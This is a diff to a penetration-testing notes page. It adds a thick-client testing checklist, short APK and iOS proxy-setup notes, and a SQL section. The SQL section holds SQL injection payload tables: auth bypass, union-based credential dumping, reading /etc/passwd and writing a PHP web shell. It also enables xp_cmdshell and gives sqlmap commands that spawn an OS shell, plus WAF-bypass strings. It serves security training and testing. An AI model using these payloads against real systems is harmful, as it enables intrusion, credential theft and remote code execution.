@@ -87,7 +87,7 @@ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
 ### Application Security Assessments
 
 {% tabs %}
-{% tab title="Web App Checklist" %}
+{% tab title="Web" %}
 ## WEB APPLICATION PENTESTING CHECKLIST
 
 **OWASP Based Checklist by** [Hariprasaanth](https://github.com/Hari-prasaanth/Thick-Client-Pentest-Checklist)
@@ -761,7 +761,7 @@ Also available on [Notion](https://hariprasaanth.notion.site/WEB-APPLICATION-PEN
 * [ ] Try to bypass OTP by status code manipulation
 {% endtab %}
 
-{% tab title="API Checklist" %}
+{% tab title="API" %}
 ### API Testing Checklist
 
 **Passive Reconnaissance**
@@ -869,5 +869,482 @@ crAPI Landing page will be located at http://127.0.0.1:8888 with the crAPI Mailh
 * [ ] `sudo git clone https://github.com/roottusk/vapi.git`
 * [ ] `cd /vapi`
 * [ ] `sudo docker-compose up -d`
+{% endtab %}
+
+{% tab title="Thick Clients" %}
+## THICK CLIENT PENTESTING CHECKLIST
+
+**OWASP Based Checklist by** [Hariprasaanth R](https://github.com/Hari-prasaanth/Thick-Client-Pentest-Checklist)
+
+Also available on [Notion ](https://hariprasaanth.notion.site/THICK-CLIENT-PENTESTING-CHECKLIST-35c6803f26eb4c9d89ba7f5fdc901fb0)\
+
+
+#### **INFORMATION GATHERING**
+
+**Information Gathering**
+
+* [ ] Find out the application architecture (two-tier or three-tier)
+* [ ] Find out the technologies used (languages and frameworks)
+* [ ] Identify network communication
+* [ ] Observe the application process
+* [ ] Observe each functionality and behavior of the application
+* [ ] Identify all the entry points
+* [ ] Analyze the security mechanism (authorization and authentication)
+
+**Tools Used**
+
+* [ ] CFF Explorer
+* [ ] Sysinternals Suite
+* [ ] Wireshark
+* [ ] PEid
+* [ ] Detect It Easy (DIE)
+* [ ] Strings
+
+#### **GUI TESTING**
+
+**Test For GUI Object Permission**
+
+* [ ] Display hidden form object
+* [ ] Try to activate disabled functionalities
+* [ ] Try to uncover the masked password
+
+**Test GUI Content**
+
+* [ ] Look for sensitive information
+
+**Test For GUI Logic**
+
+* [ ] Try for access control and injection-based vulnerabilities
+* [ ] Bypass controls by utilizing intended GUI functionality
+* [ ] Check improper error handling
+* [ ] Check weak input sanitization
+* [ ] Try privilege escalation (unlocking admin features to normal users)
+* [ ] Try payment manipulation
+
+**Tools Used**
+
+* [ ] UISpy
+* [ ] Winspy++
+* [ ] Window Detective
+* [ ] Snoop WPF
+
+#### **FILE TESTING**
+
+**Test For Files Permission**
+
+* [ ] Check permission for each and every file and folder
+
+**Test For File Continuity**
+
+* [ ] Check strong naming
+* [ ] Authenticate code signing
+
+**Test For File Content Debugging**
+
+* [ ] Look for sensitive information on the file system (symbols, sensitive data, passwords, configurations)
+* [ ] Look for sensitive information on the config file
+* [ ] Look for Hardcoded encryption data
+* [ ] Look for Clear text storage of sensitive data
+* [ ] Look for side-channel data leakage
+* [ ] Look for unreliable log
+
+**Test For File And Content Manipulation**
+
+* [ ] Try framework backdooring
+* [ ] Try DLL preloading
+* [ ] Perform Race condition check
+* [ ] Test for Files and content replacement
+* [ ] Test for Client-side protection bypass using reverse engineering
+
+**Test For Function Exported**
+
+* [ ] Try to find the exported functions
+* [ ] Try to use the exported functions without authentication
+
+**Test For Public Methods**
+
+* [ ] Make a wrapper to gain access to public methods without authentication
+
+**Test For Decompile And Application Rebuild**
+
+* [ ] Try to recover the original source code, passwords, keys
+* [ ] Try to decompile the application
+* [ ] Try to rebuild the application
+* [ ] Try to patch the application
+
+**Test For Decryption And DE obfuscation**
+
+* [ ] Try to recover original source code
+* [ ] Try to retrieve passwords and keys
+* [ ] Test for lack of obfuscation
+
+**Test For Disassemble and Reassemble**
+
+* [ ] Try to build a patched assembly
+
+**Tools Used**
+
+* [ ] Strings
+* [ ] dnSpy
+* [ ] Procmon
+* [ ] Process Explorer
+* [ ] Process Hacker
+
+#### **REGISTRY TESTING**
+
+**Test For Registry Permissions**
+
+* [ ] Check read access to the registry keys
+* [ ] Check to write access to the registry keys
+
+**Test For Registry Contents**
+
+* [ ] Inspect the registry contents
+* [ ] Check for sensitive info stored on the registry
+* [ ] Compare the registry before and after executing the application
+
+**Test For Registry Manipulation**
+
+* [ ] Try for registry manipulation
+* [ ] Try to bypass authentication by registry manipulation
+* [ ] Try to bypass authorization by registry manipulation
+
+**Tools Used**
+
+* [ ] Regshot
+* [ ] Procmon
+* [ ] Accessenum
+
+#### **NETWORK TESTING**
+
+**Test For Network**
+
+* [ ] Check for sensitive data in transit
+* [ ] Try to bypass firewall rules
+* [ ] Try to manipulate network traffic
+
+**Tools Used**
+
+* [ ] Wireshark
+* [ ] TCPview
+
+#### **ASSEMBLY TESTING**
+
+**Test For Assembly**
+
+* [ ] Verify Address Space Layout Randomization (ASLR)
+* [ ] Verify SafeSEH
+* [ ] Verify Data Execution Prevention (DEP)
+* [ ] Verify strong naming
+* [ ] Verify ControlFlowGuard
+* [ ] Verify HighentropyVA
+
+**Tools Used**
+
+* [ ] PESecurity
+
+#### **MEMORY TESTING**
+
+**Test For Memory Content**
+
+* [ ] Check for sensitive data stored in memory
+
+**Test For Memory Manipulation**
+
+* [ ] Try for memory manipulation
+* [ ] Try to bypass authentication by memory manipulation
+* [ ] Try to bypass authorization by memory manipulation
+
+**Test For Run Time Manipulation**
+
+* [ ] Try to analyze the dump file
+* [ ] Check for process replacement
+* [ ] Check for modifying assembly in the memory
+* [ ] Try to debug the application
+* [ ] Try to identify dangerous functions
+* [ ] Use breakpoints to test each and every functionality
+
+**Tools Used**
+
+* [ ] Process Hacker
+* [ ] HxD
+* [ ] Strings
+
+#### **TRAFFIC TESTING**
+
+**Test For Traffic**
+
+* [ ] Analyze the flow of network traffic
+* [ ] Try to find sensitive data in transit
+
+**Tools Used**
+
+* [ ] Echo Mirage
+* [ ] MITM Relay
+* [ ] Burp Suite
+
+#### **COMMON VULNERABILITIES TESTING**
+
+**Test For Common Vulnerabilities**
+
+* [ ] Try to decompile the application
+* [ ] Try for reverse engineering
+* [ ] Try to test with OWASP WEB Top 10
+* [ ] Try to test with OWASP API Top 10
+* [ ] Test for DLL Hijacking
+* [ ] Test for signature checks (Use Sigcheck)
+* [ ] Test for binary analysis (Use Binscope)
+* [ ] Test for business logic errors
+* [ ] Test for TCP/UDP attacks
+* [ ] Test with automated scanning tools (Use Visual Code Grepper - VCG)
+{% endtab %}
+
+{% tab title="APKs" %}
+`TargetSdkversion` \
+``OS version an app was designed for\
+\
+`< package= com.vulnerableapp.test>` \
+`Describes package/app name`\
+``\
+`<uses-sdk android:minSdkVersion="17" android:minSdkVersion="21"/>` \
+`App minimum and maximum supported versions(range)`
+
+
+
+\
+[APKLeaks](https://github.com/dwisiswant0/apkleaks) - analyze compiled APK file
+{% endtab %}
+
+{% tab title="iOS" %}
+Jailbreak Tools:
+
+Linux Jailbreak Software Checkra1n\
+[Palera1n (newer iOS Jailbreak)](https://github.com/palera1n/palera1n)\
+\
+Windows version of Checkra1n - iRa1n \
+3utools.com - iOS device management tool
+
+Testing Tools:\
+OpenSSH\
+BurpPro mobile assistant\
+\
+Application Testing setup:
+
+1. Install iproxy `npm install iproxy` and BurpSuite application proxy on host
+2. Start Burp suite and add a listener on port 8082 for all interfaces
+3. Go to iOS settings, set a manual proxy using the Burp Suite host's IP and port 8082
+4.  Connect host PC to mobile device using SSH through iproxy using&#x20;
+
+    a. `iproxy 2222 22 & ssh -R 8082:localhost:8082 root@localhost -p 2222`
+5. On iOS device visit http://burpsuite to verify connectivity and download Burp CA certificate
+6. Go to apple device settings in the "profile downloaded" section and install certificate
+7. Go Settings >General >About > Certificate Trust Settings and activate toggle switch&#x20;
+{% endtab %}
+{% endtabs %}
+
+{% tabs %}
+{% tab title="SQLi Testing" %}
+After successfully authenticating to a SQL Server \
+It is worth a shot to verify if xp\_cmdshell has been previously activated with:\
+
+
+```
+EXEC xp_cmdshell 'net user';
+```
+
+If xp\_cmdshell has not been activated, run the below commands to activate and utilize Windows XP cmd commands within SQL:
+
+<pre><code># The command below enables sp_configure 
+
+<strong>EXEC sp_configure 'show advanced options', 1;
+</strong></code></pre>
+
+```
+RECONFIGURE; sp_configure; 
+```
+
+```
+message EXEC sp_configure 'xp_cmdshell', 1;
+```
+
+```
+RECONFIGURE;
+```
+
+#### Basic SQL Testing
+
+{% tabs %}
+{% tab title="General SQL Commands" %}
+| Command       | Description                                         |
+| ------------- | --------------------------------------------------- |
+| `SELECT`      | Select data from database                           |
+| `FROM`        | Specify table to retrieve data                      |
+| `WHERE`       | Filter query to match a given condition             |
+| `INSERT`      | Add single row to table                             |
+| `CREATE`      | Used to Create a TABLE, DATABASE, INDEX or VIEW     |
+| `ALTER TABLE` | Add/Remove columns from a table                     |
+| `UPDATE`      | Update table data                                   |
+| `DELETE`      | Delete rows from table                              |
+| `AS`          | Used to rename column/table with alias              |
+| `JOIN`        | Combine rows from 2 or more tables                  |
+| `AND`         | Combine query conditions (must meet all conditions) |
+| `OR`          | Combine query conditions. (only one must be met)    |
+| `LIMIT`       | Limit the amount of rows returned                   |
+| `IN`          | Specify multiple values (only used with WHERE)      |
+| `CASE`        | Return value on a specified condition               |
+| `IS NULL`     | Return only rows with a NULL value                  |
+| `LIKE`        | Search for pattern in a column                      |
+| `COMMIT`      | Write a transaction to the database                 |
+| `ROLLBACK`    | Undo a transaction                                  |
+| `DROP`        | Delete TABLE, DATABASE or INDEX                     |
+| `GROUP BY`    | Group data into logical sets                        |
+| `ORDER BY`    | Set order of results                                |
+| `HAVING`      | Functions like WHERE but filters groups             |
+| `COUNT`       | Count rows                                          |
+| `SUM`         | Return a sum of a column                            |
+| `AVG`         | Return average of a column                          |
+| `MIN`         | Return min value of a column                        |
+| `MAX`         | Return max value of a column                        |
+{% endtab %}
+
+{% tab title="MySQL Basics" %}
+### MySQL Basics
+
+| Command                                                           | Description                                              |
+| ----------------------------------------------------------------- | -------------------------------------------------------- |
+| **General**                                                       |                                                          |
+| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                | login to mysql database                                  |
+| `SHOW DATABASES`                                                  | List available databases                                 |
+| `USE users`                                                       | Switch to database                                       |
+| **Tables**                                                        |                                                          |
+| `CREATE TABLE logins (id INT, ...)`                               | Add a new table                                          |
+| `SHOW TABLES`                                                     | List available tables in current database                |
+| `DESCRIBE logins`                                                 | Show table properties and columns                        |
+| `INSERT INTO table_name VALUES (value_1,..)`                      | Add values to table                                      |
+| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | Add values to specific columns in a table                |
+| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`  | Update table values                                      |
+| **Columns**                                                       |                                                          |
+| `SELECT * FROM table_name`                                        | Show all columns in a table                              |
+| `SELECT column1, column2 FROM table_name`                         | Show specific columns in a table                         |
+| `DROP TABLE logins`                                               | Delete a table                                           |
+| `ALTER TABLE logins ADD newColumn INT`                            | Add new column                                           |
+| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`         | Rename column                                            |
+| `ALTER TABLE logins MODIFY oldColumn DATE`                        | Change column datatype                                   |
+| `ALTER TABLE logins DROP oldColumn`                               | Delete column                                            |
+| **Output**                                                        |                                                          |
+| `SELECT * FROM logins ORDER BY column_1`                          | Sort by column                                           |
+| `SELECT * FROM logins ORDER BY column_1 DESC`                     | Sort by column in descending order                       |
+| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`             | Sort by two-columns                                      |
+| `SELECT * FROM logins LIMIT 2`                                    | Only show first two results                              |
+| `SELECT * FROM logins LIMIT 1, 2`                                 | Only show first two results starting from index 2        |
+| `SELECT * FROM table_name WHERE <condition>`                      | List results that meet a condition                       |
+| `SELECT * FROM logins WHERE username LIKE 'admin%'`               | List results where the name is similar to a given string |
+
+#### MySQL Operator Precedence
+
+* Division (`/`), Multiplication (`*`), and Modulus (`%`)
+* Addition (`+`) and Subtraction (`-`)
+* Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
+* NOT (`!`)
+* AND (`&&`)
+* OR (`||`)
+
+#### SQL Injection
+
+| Payload                                                                                                                                    | Description                                          |
+| ------------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------- |
+| **Auth Bypass**                                                                                                                            |                                                      |
+| `admin' or '1'='1`                                                                                                                         | Basic Auth Bypass                                    |
+| `admin')-- -`                                                                                                                              | Basic Auth Bypass With comments                      |
+| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)              |                                                      |
+| **Union Injection**                                                                                                                        |                                                      |
+| `' order by 1-- -`                                                                                                                         | Detect number of columns using `order by`            |
+| `cn' UNION select 1,2,3-- -`                                                                                                               | Detect number of columns using Union injection       |
+| `cn' UNION select 1,@@version,3,4-- -`                                                                                                     | Basic Union injection                                |
+| `UNION select username, 2, 3, 4 from passwords-- -`                                                                                        | Union injection for 4 columns                        |
+| **DB Enumeration**                                                                                                                         |                                                      |
+| `SELECT @@version`                                                                                                                         | Fingerprint MySQL with query output                  |
+| `SELECT SLEEP(5)`                                                                                                                          | Fingerprint MySQL with no output                     |
+| `cn' UNION select 1,database(),2,3-- -`                                                                                                    | Current database name                                |
+| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                                  | List all databases                                   |
+| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`                                 | List all tables in a specific database               |
+| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`                | List all columns in a specific table                 |
+| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`                                                                       | Dump data from a table in another database           |
+| **Privileges**                                                                                                                             |                                                      |
+| `cn' UNION SELECT 1, user(), 3, 4-- -`                                                                                                     | Find current user                                    |
+| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`                                                               | Find if user has admin privileges                    |
+| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -`                  | Find if all user privileges                          |
+| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
+| **File Injection**                                                                                                                         |                                                      |
+| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                                                                                   | Read local file                                      |
+| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`                                                               | Write a string to a local file                       |
+| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`                                  | Write a web shell into the base web directory        |
+{% endtab %}
+
+{% tab title="NoSQL Basics" %}
+### NoSQL Basics
+
+| Command                                                            | Description                                                       |
+| ------------------------------------------------------------------ | ----------------------------------------------------------------- |
+| `show dbs;`                                                        | List all the databases present                                    |
+| `use user_creds;`                                                  | Switch to database named "user\_creds"                            |
+| `show collections;`                                                | List out the collections in a database                            |
+| `db.flag.find().pretty()`                                          | Dump the contents of the documents present in the flag collection |
+| `http://url?login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto` | Basic NoSQLi Login                                                |
+{% endtab %}
+
+{% tab title="SQLmap" %}
+### SQLmap
+
+| Command                                                                                                                   | Description                                                 |
+| ------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
+| `sqlmap -h`                                                                                                               | View the basic help menu                                    |
+| `sqlmap -hh`                                                                                                              | View the advanced help menu                                 |
+| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`                                                                | Run `SQLMap` without asking for user input                  |
+| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`                                                               | `SQLMap` with POST request                                  |
+| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`                                                              | POST request specifying an injection point with an asterisk |
+| `sqlmap -r req.txt`                                                                                                       | Passing an HTTP request file to `SQLMap`                    |
+| `sqlmap ... --cookie='PHPSESSID=abcdefghijklmnop'`                                                                        | Specifying a cookie header                                  |
+| `sqlmap -u www.target.com --data='id=1' --method PUT`                                                                     | Specifying a PUT request                                    |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`                                             | Store traffic to an output file                             |
+| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`                                                            | Specify verbosity level                                     |
+| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`                                                     | Specifying a prefix or suffix                               |
+| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                                                                          | Specifying the level and risk                               |
+| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba`                                  | Basic DB enumeration                                        |
+| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`                                                             | Table enumeration                                           |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname`                                      | Table/row enumeration                                       |
+| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"`                             | Conditional enumeration                                     |
+| `sqlmap -u "http://www.example.com/?id=1" --schema`                                                                       | Database schema enumeration                                 |
+| `sqlmap -u "http://www.example.com/?id=1" --search -T user`                                                               | Searching for data                                          |
+| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`                                                            | Password enumeration and cracking                           |
+| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                      |
+| `sqlmap --list-tampers`                                                                                                   | List all tamper scripts                                     |
+| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`                                                              | Check for DBA privileges                                    |
+| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`                                                      | Reading a local file                                        |
+| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`                 | Writing a file                                              |
+| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                                                                     | Spawning an OS shell                                        |
+{% endtab %}
+{% endtabs %}
+
+**WAF BYPASSES**
+
+```
+SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
+```
+
+**Passwords**
+
+```
+uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users
+uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users
+```
+{% endtab %}
+
+{% tab title="Second Tab" %}
+
 {% endtab %}
 {% endtabs %}
